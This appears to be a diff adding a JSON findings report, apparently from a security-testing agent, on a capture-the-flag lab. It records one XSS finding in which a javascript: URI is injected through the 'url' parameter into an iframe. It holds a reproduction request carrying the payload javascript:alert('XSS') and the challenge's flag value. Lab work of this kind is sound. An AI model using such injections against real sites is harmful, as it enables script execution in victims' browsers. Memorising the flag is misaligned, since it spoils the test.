@@ -1,0 +1,25 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:46:49.948133+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "f4e54ad2-0464-4d21-a319-cafcd1a0a2e7",
+      "timestamp": "2026-04-14T23:46:49.948006+00:00",
+      "title": "XSS Vulnerability - Dalgona CTF Challenge",
+      "severity": "high",
+      "target": "http://172.17.0.1:35973/page",
+      "description": "Cross-Site Scripting vulnerability in the page parameter allows injection of javascript: URIs in iframe src attribute. The challenge required executing XSS with the string 'XSS' to reveal the flag.",
+      "evidence": "flag{7aa5167c-aaad-4587-b76c-044ae6107e7a}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:35973/page?url=javascript:alert('XSS')",
+        "expected": "Response contains flag{7aa5167c-aaad-4587-b76c-044ae6107e7a}"
+      }
+    }
+  ],
+  "diagrams": []
+}
